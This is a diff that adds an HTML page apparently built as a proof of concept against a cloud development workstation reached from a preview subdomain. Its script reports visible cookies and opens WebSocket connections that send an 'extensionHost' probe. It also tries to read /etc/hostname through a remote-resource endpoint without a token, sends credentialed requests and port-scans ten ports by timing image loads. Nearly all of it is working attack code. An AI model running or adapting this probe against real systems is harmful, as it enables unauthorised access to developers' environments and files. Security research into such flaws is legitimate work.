@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head><title>Preview Test</title></head>
+<body>
+<h2>WebSocket Cross-Subdomain Test</h2>
+<pre id="log"></pre>
+<script>
+var log = document.getElementById('log');
+function l(msg) { log.textContent += msg + '\n'; }
+
+var previewHost = location.hostname;
+var wsHost = previewHost.replace(/^\d+-/, '');
+
+l('[*] Preview origin: ' + location.origin);
+l('[*] Target workstation: ' + wsHost);
+l('[*] Cookies visible: ' + (document.cookie.length > 0 ? 'YES (' + document.cookie.length + ' chars)' : 'NONE'));
+
+var paths = [
+  '/ws',
+  '/?tkn=none',
+  '/',
+  '/ws?reconnectionToken=none&reconnection=false&skipWebSocketFrames=false'
+];
+
+var protocols = ['wss://', 'ws://'];
+
+var tried = 0;
+var connected = 0;
+
+protocols.forEach(function(proto) {
+  paths.forEach(function(path) {
+    var url = proto + wsHost + path;
+    try {
+      var ws = new WebSocket(url);
+      tried++;
+      var thisUrl = url;
+
+      ws.onopen = function() {
+        connected++;
+        l('[+] CONNECTED: ' + thisUrl);
+        l('[+] readyState: ' + ws.readyState);
+
+        ws.send(JSON.stringify({
+          type: 'extensionHost',
+          id: 'test-probe'
+        }));
+      };
+
+      ws.onmessage = function(e) {
+        var data = typeof e.data === 'string' ? e.data.substring(0, 200) : '(binary ' + e.data.size + 'b)';
+        l('[+] MSG from ' + thisUrl + ': ' + data);
+      };
+
+      ws.onerror = function(e) {
+        l('[-] ERR: ' + thisUrl);
+      };
+
+      ws.onclose = function(e) {
+        l('[x] CLOSED: ' + thisUrl + ' code=' + e.code + ' reason=' + e.reason);
+      };
+    } catch(ex) {
+      l('[!] EXCEPTION: ' + url + ' - ' + ex.message);
+    }
+  });
+});
+
+l('[*] Attempted ' + tried + ' WebSocket connections');
+
+setTimeout(function() {
+  l('\n[*] === FINAL RESULTS ===');
+  l('[*] Connected: ' + connected + '/' + tried);
+
+  l('\n[*] === FETCH TESTS ===');
+
+  fetch('https://' + wsHost + '/vscode-remote-resource?path=/etc/hostname')
+    .then(function(r) { return r.text().then(function(t) { l('[FETCH] /etc/hostname (no tkn): ' + r.status + ' - ' + t.substring(0,50)); }); })
+    .catch(function(e) { l('[FETCH] /etc/hostname: ' + e.message); });
+
+  fetch('https://' + wsHost + '/')
+    .then(function(r) { l('[FETCH] / : ' + r.status + ' type=' + r.headers.get('content-type')); })
+    .catch(function(e) { l('[FETCH] / : ' + e.message); });
+
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'https://' + wsHost + '/version', true);
+  xhr.withCredentials = true;
+  xhr.onload = function() { l('[XHR] /version: ' + xhr.status + ' - ' + xhr.responseText.substring(0, 100)); };
+  xhr.onerror = function() { l('[XHR] /version: CORS blocked or error'); };
+  xhr.send();
+
+}, 3000);
+
+setTimeout(function() {
+  l('\n[*] === PORT SCAN ===');
+  var ports = [80, 443, 6000, 9000, 9002, 9402, 3000, 5000, 8080, 8443];
+  ports.forEach(function(port) {
+    var img = new Image();
+    var start = Date.now();
+    img.onload = function() { l('[PORT] ' + port + ': OPEN (img loaded in ' + (Date.now()-start) + 'ms)'); };
+    img.onerror = function() {
+      var elapsed = Date.now() - start;
+      l('[PORT] ' + port + ': ' + (elapsed < 1000 ? 'OPEN (fast reject ' + elapsed + 'ms)' : 'filtered/closed (' + elapsed + 'ms)'));
+    };
+    img.src = 'https://' + wsHost + ':' + port + '/favicon.ico?' + Date.now();
+  });
+}, 5000);
+</script>
+</body>
+</html>
